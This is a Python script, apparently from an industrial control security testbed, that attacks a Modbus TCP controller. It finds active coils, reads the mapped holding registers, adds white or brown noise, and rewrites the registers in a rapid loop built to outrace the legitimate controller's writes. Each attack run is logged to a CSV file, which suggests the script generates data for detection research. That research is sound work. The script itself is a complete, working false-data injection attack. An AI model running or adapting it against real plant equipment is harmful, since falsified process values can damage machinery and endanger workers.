import time
import struct
import random
import argparse
import csv
import os
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
from utils import read_memory, write_memory

parser = argparse.ArgumentParser(
    description="Bias Injector - Injects white/brown noise into Modbus holding registers",
    usage="python3 bias_injector.py --duration <DURATION> [--white] [--brown] [--wn_mean <MEAN>] [--wn_stddev <STDDEV>] [--bn_alpha <ALPHA>] [--bn_stddev <STDDEV>]"
)

parser.add_argument("--duration", help="Duration of the attack (0 = infinite)", type=int, required=False, default=0)
parser.add_argument("--white", help="Whether to inject white noise", action='store_true')
parser.add_argument("--brown", help="Whether to inject brown noise", action='store_true')
parser.add_argument("--wn_stddev", help="Standard deviation of white noise", type=float, required=False, default=0.0)
parser.add_argument("--bn_alpha", help="Alpha parameter for brown noise (AR(1) coefficient)", type=float, required=False, default=0.0)
parser.add_argument("--bn_stddev", help="Standard deviation for brown noise innovation", type=float, required=False, default=0.0)
parser.add_argument("--scan_interval", help="Seconds between active-coil rescans (default: 5.0)", type=float, required=False, default=5.0)
parser.add_argument("--write_interval", help="Seconds between rapid write bursts (default: 0.05)", type=float, required=False, default=0.05)

args = parser.parse_args()

# Connect to Modbus device
try:
    client = ModbusTcpClient(host="192.168.60.4", port=502)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)
except Exception as e:
    print(Fore.RED + "The IP address or the port is incorrect. Please check the configurations." + Style.RESET_ALL)
    exit(1)

# Mapping from coil number to holding register address (float stored in two 16-bit registers)
coil_memory_mapping = {
    0: 2048,
    1: 2050,
    2: 2052,
    3: 2054,
    4: 2056,
    5: 2058,
    6: 2060,
    7: 2062,
    8: 2064,
    9: 2066,
    10: 2068,
    11: 2070,
    12: 2072,
    13: 2074,
    14: 2076,
    15: 2078,
    78: 2080,
    79: 2082,
    80: 2084,
    81: 2086,
    82: 2088,
    83: 2090,
    84: 2092
}

def get_enabled_coils(client, addresses):
    """Return list of coil addresses that are currently True (enabled)."""
    enabled = []
    for addr in addresses:
        result = client.read_coils(address=addr, count=1)
        if not result.isError() and result.bits[0]:
            enabled.append(addr)
    return enabled

# --- LOGGING SETUP ---
LOG_FILE = "log_bi_slitting_notching.csv"

# Define the CSV headers
csv_headers = [
    "id",
    "attack_type",
    "start_time",
    "end_time",
    "duration_seconds",
    "wn_stddev",
    "bn_alpha",
    "bn_stddev",
    "scan_interval",
    "write_interval",
    "active_coils_count",
    "active_coils_list",
    "max_coils_scanned",
    "target_host"
]

# Determine attack type for logging
attack_types = []
if args.white:
    attack_types.append("white_noise")
if args.brown:
    attack_types.append("brown_noise")
attack_type_str = "+".join(attack_types) if attack_types else "none"

# Record start time (human-readable and epoch)
start_time = time.time()
start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

max_coils = 300

# Set up duration
if args.duration > 0:
    end_time = start_time + args.duration
    infinite = False
else:
    infinite = True
    end_time = float('inf')

print(f"Attack running... Press Ctrl+C to stop manually.")

# --- Outer state ---
active_coils = []
brown_state = {}
# injected_values holds the last-computed noisy value per coil address,
# so the rapid write loop can keep re-writing it without re-reading each time.
injected_values = {}

last_scan_time = 0.0
active_coils_snapshot = []  # Keep track of which coils were active at least once
attack_ended_by = "duration"  # Will be updated if interrupted

try:
    while time.time() < end_time:
        now = time.time()

        # ----------------------------------------------------------------
        # SLOW LOOP: rescan active coils and recompute noise targets
        # ----------------------------------------------------------------
        if now - last_scan_time >= args.scan_interval:
            last_scan_time = now

            enabled_coils = get_enabled_coils(client, range(max_coils))
            active_coils = [c for c in enabled_coils if c in coil_memory_mapping]

            # Track which coils were active at any point
            for coil in active_coils:
                if coil not in active_coils_snapshot:
                    active_coils_snapshot.append(coil)

            # Preserve brown state for coils that were already tracked
            brown_state = {c: brown_state.get(c, 0.0) for c in active_coils}

            # Read current register values once per scan to get a fresh baseline
            for coil in active_coils:
                mem_addr = coil_memory_mapping[coil]
                original = read_memory(client, mem_addr)
                if original is None:
                    continue

                noise = 0.0

                if args.white:
                    noise += random.gauss(0, args.wn_stddev)

                if args.brown:
                    prev = brown_state[coil]
                    new_val = args.bn_alpha * prev + random.gauss(0.0, args.bn_stddev)
                    brown_state[coil] = new_val
                    noise += new_val

                injected_values[mem_addr] = original + noise

        # ----------------------------------------------------------------
        # FAST LOOP: continuously overwrite registers with injected values
        # This outraces the legitimate controller writes.
        # ----------------------------------------------------------------
        for coil in active_coils:
            mem_addr = coil_memory_mapping[coil]
            if mem_addr in injected_values:
                write_memory(client, mem_addr, injected_values[mem_addr])

        time.sleep(args.write_interval)

except KeyboardInterrupt:
    print(Fore.CYAN + "\nAttack interrupted by user." + Style.RESET_ALL)
    attack_ended_by = "keyboard_interrupt"
finally:
    # Record end time
    end_time_actual = time.time()
    end_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    actual_duration = end_time_actual - start_time
    
    client.close()
    print(Fore.GREEN + "Connection closed." + Style.RESET_ALL)
    
    # --- LOGGING TO CSV ---
    # Generate a unique ID based on timestamp
    attack_id = datetime.now().strftime("%Y%m%d_%H%M%S") + f"_{random.randint(1000, 9999)}"
    
    # Prepare the row data
    log_row = {
        "id": attack_id,
        "attack_type": attack_type_str,
        "start_time": start_time_str,
        "end_time": end_time_str,
        "duration_seconds": f"{actual_duration:.2f}",
        "wn_stddev": args.wn_stddev,
        "bn_alpha": args.bn_alpha,
        "bn_stddev": args.bn_stddev,
        "scan_interval": args.scan_interval,
        "write_interval": args.write_interval,
        "active_coils_count": len(active_coils_snapshot),
        "active_coils_list": str(sorted(active_coils_snapshot)),
        "max_coils_scanned": max_coils,
        "target_host": "192.168.60.4:502"
    }
    
    # Check if file exists to determine if we need to write headers
    file_exists = os.path.isfile(LOG_FILE)
    
    try:
        with open(LOG_FILE, mode='a', newline='') as csv_file:
            writer = csv.DictWriter(csv_file, fieldnames=csv_headers)
            
            # Write header only if file is new
            if not file_exists:
                writer.writeheader()
            
            # Write the attack record
            writer.writerow(log_row)
        
        print(Fore.CYAN + f"Attack logged to {LOG_FILE} (ID: {attack_id})" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error writing to log file: {e}" + Style.RESET_ALL)